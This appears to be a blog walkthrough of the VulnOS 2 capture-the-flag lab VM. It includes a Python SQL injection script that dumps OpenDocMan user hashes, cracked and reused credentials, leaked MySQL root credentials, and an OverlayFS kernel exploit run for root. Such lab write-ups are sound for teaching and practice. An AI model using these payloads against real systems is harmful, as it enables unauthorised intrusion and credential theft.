---
layout: post
title: VulnOS 2 CTF Walkthrough
date: 2017-08-18
categories:
  - security
  - ctf
  - walkthrough
tags:
  - vulnos
  - vulnhub
---
## Service Discovery
A full port scan using `masscan` (`masscan -p 0-65535 10.2.0.104 --rate=500`) revealed three open ports: 22, 80 and 6667. Nmap subsequently fingerprinted  the services on these ports to be OpenSSH, Apache and ngircd:

```shell_session
root@kali:~# nmap -sS -sV -sC -p 6667,22,80 10.2.0.104
***
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)
|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)
|   256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)
|_  256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 (EdDSA)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: VulnOSv2
6667/tcp open  irc     ngircd
MAC Address: 08:00:27:57:4F:AA (Oracle VirtualBox virtual NIC)
Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel
***
```

Connecting to the IRC server confirmed the version number of ngircd in use [v21], which I was unable to find any known vulnerabilities for.

```
22:51 -!- Irssi: Looking up 10.2.0.104
22:51 -!- Irssi: Connecting to 10.2.0.104 [10.2.0.104] port 6667
22:51 -!- Irssi: Connection to 10.2.0.104 established
22:51 -!- Welcome to the Internet Relay Network rastating!~rastating@10.2.0.1
22:51 -!- Your host is irc.example.net, running version ngircd-21 (i686/pc/linux-gnu)
```

## Drupal
The index of the web server contained a landing page which pointed towards the `/jabc/` directory. A look at the markup in this directory quickly made it clear that it is a Drupal installation.

The first thing I checked out was the module directories (`/jabc/modules` and `/jabc/sites/all/modules`) and cross referenced them with the exploits listed on Exploit-DB for Drupal, but there were none that matched up.

Next, I used Burp's repeater to iterate pages 0-50 (`/jabc/?q=node/{{PAGE_ID}}`) to see if there was any interesting unlisted pages. Doing this led me to page 7 [`/jabc/?q=node/7`], which had the following content:

```xml
<p><span style="color:#000000">For security reasons, this section is hidden.</span></p>
<p><span style="color:#000000">For a detailed view and documentation of our products, please visit our documentation platform at /jabcd0cs/ on the server. Just login with guest/guest</span></p>
```

Navigating to `/jabcd0cs/` revealed an OpenDocMan installation.

## OpenDocMan
The OpenDocMan installation found in `/jabcd0cs/` was tagged as being version 1.2.7 which has known vulnerabilities (https://www.exploit-db.com/exploits/32075/), but first, I logged in as the `guest` account and attempted to upload a PHP file, but the MIME type wasn't allowed and seemingly couldn't be spoofed.

A quick test of the SQL injection vulnerability in `ajax_udf.php` proves that it is working, and adds the output into the combo box:

![OpenDocMan SQL Injection](/assets/images/vulnos-2-ctf-walkthrough/opendocman_sqli.png)

Rather than use this to traverse the database schema, I took a look at the [GitHub Project](https://github.com/opendocman/opendocman/) and found the database schema (https://gist.github.com/rastating/3153cec9de24fa995a069abe99e75c1d)

I then wrote a small Python script to dump the usernames and password hashes from the `odm_user` table using the SQL injection:

```python
import requests
import re

p = re.compile('value=999\s>(.+?)<\/option')
r = requests.get("http://10.2.0.104/jabcd0cs/ajax_udf.php", params={ 'q': "1", "add_value": "odm_user UNION SELECT 999, concat(username, 0x3a, password), 3,4,5,6,7,8,9 from odm_user" })

for m in re.finditer(p, r.text):
  print m.group(1)
```

When running the script, it found two accounts:

```
webmin:b78aae356709f8c31118ea613980954b
guest:084e0343a0486ff05530df6c705c8bb4
```

The `guest` account I already had access to, so presumably the `webmin` account was an administrator. I ran the hash through md5decrypt.org, which indicated the plain text was `webmin1980`.

I was able to now login to OpenDocMan as an administrator, by using `webmin:webmin1980`, and added some new mime types (`application/x-php` and `text/x-php`) to allow me to upload a PHP script, but although I was able to upload a PHP script, it was never being interpreted, and instead was being sent back as plain text.

Next, I tried the same credentials on the Drupal installation and found that they work there too, but there was seemingly no way to upload any PHP scripts in the Drupal admin area.

## Webmin Shell
As the credentials I had found in OpenDocMan were shared with Drupal, I decided to try using them to SSH into the VM, and was successful in doing so; giving me access to a low privilege shell.

Firstly, I checked to see if there were any sudo privileges for this account, but as I suspected, `webmin` wasn't in the sudoers file:

```shell_session
$ sudo -l
[sudo] password for webmin:
Sorry, user webmin may not run sudo on VulnOSv2.
```

The only thing in the home directory was a file named `post.tar.gz`, which contained a copy of Hydra; so nothing of use.

As there was password re-use across multiple applications, I took a look in the configuration file for OpenDocMan [`/var/www/html/jabcd0cs/config.php`], to see how it was connecting to MySQL:

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for [OpenDocMan */
define('DB_NAME', 'jabcd0cs');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASS', 'toor');
```

In the hope the system `root` user is sharing the same password as the MySQL one, I tried to `su` with the password `toor`, but the switch failed.

Next, I took a look at the kernel version, and identified that the VM was vulnerable to the OverlayFS exploit (https://www.exploit-db.com/exploits/37292/).

I grabbed the exploit, compiled it, ran it, and proceeded to get the flag:

```shell_session
webmin@VulnOSv2:~$ gcc overlayfs.c -o ofs
webmin@VulnOSv2:~$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root
# cd /root
# ls
flag.txt
# cat flag.txt
Hello and welcome.
You successfully compromised the company "JABC" and the server completely !!
Congratulations !!!
Hope you enjoyed it.

What do you think of A.I.?
#
```
